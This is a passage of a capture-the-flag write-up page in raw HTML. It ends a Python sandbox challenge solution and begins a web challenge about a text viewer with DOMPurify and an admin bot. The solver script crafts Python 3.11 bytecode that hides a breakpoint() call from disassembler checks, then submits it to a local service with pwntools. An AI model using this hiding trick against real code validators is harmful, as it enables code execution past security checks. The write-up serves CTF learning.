class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF\">JUMP_FORWARD\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF\">COMPARE_OP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#99A0A6\">#\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF\">PRECALL\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF\">JUMP_FORWARD\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#99A0A6\">#\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF\">COMPARE_OP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#99A0A6\">#\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF\">CALL\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF\">JUMP_FORWARD\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#99A0A6\">#\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF\">JUMP_FORWARD\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#99A0A6\">#\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF\">JUMP_FORWARD\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#99A0A6\">#\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF\">JUMP_FORWARD\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#99A0A6\">#\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF\">COMPARE_OP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#99A0A6\">#\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF\">POP_TOP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF\">LOAD_CONST\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF\">JUMP_FORWARD\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#99A0A6\">#\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF\">COMPARE_OP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#99A0A6\">#\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF\">RETURN_VALUE\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">])\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#79B8FF\">print\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#F97583\">f\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"New code: \u003C/span>\u003Cspan style=\"--0:#79B8FF\">{\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">new_code\u003C/span>\u003Cspan style=\"--0:#79B8FF\">}\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">dis.dis(new_code )\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#79B8FF\">print\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'-'\u003C/span>\u003Cspan style=\"--0:#F97583\">*\u003C/span>\u003Cspan style=\"--0:#79B8FF\">40\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">dis.dis(new_code, \u003C/span>\u003Cspan style=\"--0:#FFAB70\">show_caches\u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#79B8FF\">True\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> )\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">new_code_section \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">len\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(new_code).to_bytes(\u003C/span>\u003Cspan style=\"--0:#79B8FF\">4\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#FFAB70\">byteorder\u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'little'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">) \u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> new_code\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">new_code_object \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> prefix \u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> new_code_section \u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> suffiix\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">payload \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> base64.b64encode(new_code_object)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">def\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">runner\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">():\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF\">...\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">runner.\u003C/span>\u003Cspan style=\"--0:#79B8FF\">__code__\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> marshal.loads(new_code_object)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#99A0A6\"># runner()\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">from\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> pwn \u003C/span>\u003Cspan style=\"--0:#F97583\">import\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">*\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">r \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> remote(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'localhost'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">33851\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">r.sendlineafter(\u003C/span>\u003Cspan style=\"--0:#F97583\">b\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"opcode?\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#F97583\">b\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"JUMP_FORWARD\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">r.sendlineafter(\u003C/span>\u003Cspan style=\"--0:#F97583\">b\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"these...\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, payload)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">r.interactive()\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"import opcodefrom opcode import opmapimport base64import disimport marshalimport tempfileimport sys, osfor k in opmap:    globals()[k] = opmap[k]def f():    breakpoint()code = f.__code__b = marshal.dumps(code)dis.dis(code, show_caches=True)co_code = code.co_codeprint(len(co_code))co_code_section = len(co_code).to_bytes(4, byteorder=&#x27;little&#x27;) + co_codeprefix = b[:b.find(co_code_section)]suffiix = b[b.find(co_code_section) + len(co_code_section):]&#x22;&#x22;&#x22;Note: Lines that end with #, indicate its visible to dis.Bytecode, rest are hidden&#x22;&#x22;&#x22;new_code = bytearray([    JUMP_FORWARD, 1, #    COMPARE_OP, 0, #    LOAD_GLOBAL, 1,    0, 0,    COMPARE_OP, 0, #    0, 0,    0, 0,    COMPARE_OP, 0, #    NOP, 0,    JUMP_FORWARD, 1,    COMPARE_OP, 0, #    PRECALL, 0,    0, 0,    JUMP_FORWARD, 1, #    COMPARE_OP, 0, #    CALL, 0,    0, 0,    JUMP_FORWARD, 1, #    JUMP_FORWARD, 1, #    JUMP_FORWARD, 1, #    JUMP_FORWARD, 1, #    COMPARE_OP, 0, #    POP_TOP, 0,    LOAD_CONST, 0,    JUMP_FORWARD, 1, #    COMPARE_OP, 0, #    RETURN_VALUE, 0])print(f&#x22;New code: {new_code}&#x22;)dis.dis(new_code )print(&#x27;-&#x27;*40)dis.dis(new_code, show_caches=True )new_code_section = len(new_code).to_bytes(4, byteorder=&#x27;little&#x27;) + new_codenew_code_object = prefix + new_code_section + suffiixpayload = base64.b64encode(new_code_object)def runner():    ...runner.__code__ = marshal.loads(new_code_object)# runner()from pwn import *r = remote(&#x27;localhost&#x27;, 33851)r.sendlineafter(b&#x22;opcode?&#x22;, b&#x22;JUMP_FORWARD&#x22;)r.sendlineafter(b&#x22;these...&#x22;, payload)r.interactive()\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Ch3 id=\"notes-1\">\u003Ca href=\"#notes-1\">Notes\u003C/a>\u003C/h3>\n\u003Cp>This was hopefully a fun challenge to solve. I think the overall payload is not too long, but the main inspiration is realizing how to trick the disassembler in what is actually being run. Its interesting to see how the code is offset by the CACHE entries, and how we can use this to our advantage.\u003C/p>\n\u003Cp>This challenge had one solve by \u003Ccode>Maple Bacon\u003C/code>, and used an additional trick, which was the fact that the code object could contain lambda functions, but these would not be checked by the disassembler. This allowed them to create a lambda function that would execute the hidden code object. However in order to call this lambda function, it was still necessary to use the CACHE jump trick. Very nice!\u003C/p>\n\u003Ch3 id=\"references-1\">\u003Ca href=\"#references-1\">References\u003C/a>\u003C/h3>\n\u003Cul>\n\u003Cli>\u003Ca href=\"https://docs.python.org/3.11/whatsnew/3.11.html#cpython-bytecode-changes\">https://docs.python.org/3.11/whatsnew/3.11.html#cpython-bytecode-changes\u003C/a>\u003C/li>\n\u003Cli>\u003Ca href=\"https://github.com/python/cpython/issues/90997\">https://github.com/python/cpython/issues/90997\u003C/a>\u003C/li>\n\u003C/ul>\n\u003Chr>\n\u003Ch1 id=\"web\">\u003Ca href=\"#web\">Web\u003C/a>\u003C/h1>\n\u003Ch2 id=\"fancy_text_viewer-4-solves-444-pts\">\u003Ca href=\"#fancy_text_viewer-4-solves-444-pts\">fancy_text_viewer (4 solves, 444 pts)\u003C/a>\u003C/h2>\n\u003Ch3 id=\"description-2\">\u003Ca href=\"#description-2\">Description\u003C/a>\u003C/h3>\n\u003Cp>WOW TEXT SO COOL. Take a look at how cool I made this text. I hear the admin gets special text, not fair!\u003C/p>\n\u003Ch3 id=\"challenge-2\">\u003Ca href=\"#challenge-2\">Challenge\u003C/a>\u003C/h3>\n\u003Cp>You are given source code and a route to a website called Fancy Text Viewer. Upon logging in, you are greeted with a simple page that allows you to enter text:\n\u003Cimg __ASTRO_IMAGE_=\"{&#x22;src&#x22;:&#x22;image.png&#x22;,&#x22;alt&#x22;:&#x22;&#x22;,&#x22;index&#x22;:0}\">\u003C/p>\n\u003Cp>When entered, you are taken to \u003Ccode>/view\u003C/code> where you can see the text you entered in a fancy format.\u003C/p>\n\u003Cp>The \u003Ccode>app.js\u003C/code> is the most important file in this challenge. We import the following dependencies:\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"js\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">import\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> express \u003C/span>\u003Cspan style=\"--0:#F97583\">from\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"express\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">;\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">import\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> cookieParser \u003C/span>\u003Cspan style=\"--0:#F97583\">from\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"cookie-parser\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">;\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">import\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> fs \u003C/span>\u003Cspan style=\"--0:#F97583\">from\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"fs\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">;\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">import\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> { JSDOM } \u003C/span>\u003Cspan style=\"--0:#F97583\">from\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"jsdom\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">;\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">import\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> createDOMPurify \u003C/span>\u003Cspan style=\"--0:#F97583\">from\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"dompurify\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">;\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">import\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> bot_goto \u003C/span>\u003Cspan style=\"--0:#F97583\">from\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"./bot.js\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">;\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"import express from &#x22;express&#x22;;import cookieParser from &#x22;cookie-parser&#x22;;import fs from &#x22;fs&#x22;;import { JSDOM } from &#x22;jsdom&#x22;;import createDOMPurify from &#x22;dompurify&#x22;;import bot_goto from &#x22;./bot.js&#x22;;\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Cp>We then create the express app, and set up the cookie parser. We then define various routes:\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"js\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">const\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">app\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">express\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">();\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">...\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">app.\u003C/span>\u003Cspan style=\"--0:#B392F0\">set\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"view engine\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"ejs\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">app.\u003C/span>\u003Cspan style=\"--0:#B392F0\">use\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#B392F0\">cookieParser\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">());\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">app.\u003C/span>\u003Cspan style=\"--0:#B392F0\">use\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'/static'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, express.\u003C/span>\u003Cspan style=\"--0:#B392F0\">static\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'public'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">))\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">app.\u003C/span>\u003Cspan style=\"--0:#B392F0\">use\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">((\u003C/span>\u003Cspan style=\"--0:#FFAB70\">req\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#FFAB70\">res\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#FFAB70\">next\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">) \u003C/span>\u003Cspan style=\"--0:#F97583\">=>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"--0:#F97583\">const\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">key\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> req.query) {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">        \u003C/span>\u003Cspan style=\"--0:#F97583\">let\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> value \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> req.query[key];\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">        \u003C/span>\u003Cspan style=\"--0:#F97583\">delete\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> req.query[key];\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">req.query[key.\u003C/span>\u003Cspan style=\"--0:#B392F0\">toLowerCase\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">()] \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> value;\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">}\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#B392F0\">next\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">();\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">});\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">app.\u003C/span>\u003Cspan style=\"--0:#B392F0\">get\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"/\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, (\u003C/span>\u003Cspan style=\"--0:#FFAB70\">req\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#FFAB70\">res\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">) \u003C/span>\u003Cspan style=\"--0:#F97583\">=>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan 